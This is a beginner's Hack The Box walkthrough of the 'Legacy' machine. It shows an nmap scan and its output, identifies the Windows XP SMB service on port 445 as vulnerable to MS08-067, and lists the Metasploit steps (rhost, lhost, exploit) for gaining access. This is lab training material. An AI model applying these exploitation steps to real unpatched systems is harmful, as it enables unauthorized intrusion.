+++
author = "Jake Rice"
title = "This is my Legacy"
date = "2022-05-25"
description = ""
tags = [
    "HTB",
    "CTF_Walkthrough",
]

featureImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Legacy_logo.png"
thumbnail = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Legacy_logo.png"
shareImage = "https://raw.githubusercontent.com/JRHacka/Blog-Site/main/jrhacka/static/images/Legacy_logo.png"

+++
The clever titles just don't stop! This is my walkthrough of the Legacy HTB. Enjoy, find the video below, and reach out if you have any questions. 

<!--more-->
---
## Startup

This is an entry level beginner friendly box, so the walkthrough is going to be the same. With that being said, the first step that other walkthroughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.

HTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.

The first step if you are connecting via OpenVPN is to first make sure you have OpenVPN installed on your device. Either start typing the command see if it autofill’s, or if using Kali run:
```bash
sudo apt install openvpn
```
Once you are sure is installed in the same place where you see the attack box you can select OpenVPN. Change the server if desired and then download the file. Find the file location and run the following command:
```bash
openvpn insert/filepath/here
```

After you have connected you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up.
{{% notice note "Heads Up"%}}
That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.
{{% /notice %}}

---

## Intelligence Gathering

The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used.
```bash
nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/WU/Legacy/nmap/scans
```
{{% notice tip "NMAP Flags"%}}
-sT = TCP Connect() Scan

-sV = OS Version

-Pn = Scan all ports, and don't ping. (Scans ports no matter what)

-p- = All ports

-A = All

-T3 = Speed level. (Options 1-5 with 1 being slowest and 5 fastest)

-oA = output namp in the three formats to the specified file path.
{{% /notice %}}

While that is running let's go ahead and see if we can find anything at the IP. Open up a web browser and put in the target machines IP address. We don't get any results, but we'll check a couple of the usual directories just in case. I searched around using /admin /login /user /signin /contact and got nothing, so let’s dive in to those NMap results.
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-31 15:13 EDT
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 4.02% done; ETC: 15:13 (0:00:24 remaining)
Nmap scan report for 10.10.10.4
Host is up (0.036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/31%OT=135%CT=1%CU=33269%PV=Y%DS=2%DC=T%G=Y%TM=62E6D4
OS:75%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS
OS:=0)OPS(O1=M54DNW0NNT00NNS%O2=M54DNW0NNT00NNS%O3=M54DNW0NNT00%O4=M54DNW0N
OS:NT00NNS%O5=M54DNW0NNT00NNS%O6=M54DNNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W
OS:4=FAF0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M54DNW0NNS%CC=N%Q=)T1(
OS:R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=
OS:%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M54DNW0NNT00NNS%RD=0%Q=
OS:)T4(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=N%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=B0%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m38s, deviation: 2h07m16s, median: 4d22h57m38s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:bb:84 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-08-06T00:11:25+03:00

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   37.58 ms 10.10.14.1
2   37.69 ms 10.10.10.4

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.41 seconds
```

So, we've got one item that really catches my eye in that NMap scan. Port 445 Windows XP microsoft-ds is open and based on previous knowledge a really good place to start.

---
## Port 445 - Windows XP microsoft-ds

In the NMap scan the first thing that should catch your eye is that port 445 is open, and after a quick google you'll quickly find MS08-067. Port 139 and 445 are SMB ports that are used for file transfer, and back in the day it used to run on top of NetBIOS. Now days port 445 TCP can be used for file transfer. When looking for this specific version you do find that there is an exploit for it. 

---


## Exploiting the Vulnerability

From our research we see we can use this exploit via Metasploit. Lets get it spun up and dive in.
```bash
msfconsole
```
Once you have it started we can get it set up.

{{% notice tip "Metasploit Setup"%}}
1-Search MS08-067

2-Use show options

3-Set the rhost as the target IP (set rhost tar.get.ip.add)

4-Set the lhost as your IP (set lhost your.HTB.ip.add)(The IP given to you via HTB (it's in the green box))

5-Use exploit (exploit OR run)
{{% /notice %}}

It works!! Now time to dig around and find the flags. I'll leave that part for you, but feel free to message me if you need a hand!

---

## Walkthrough Video

{{< youtube 39tOHZCG7E0 >}}

<br>
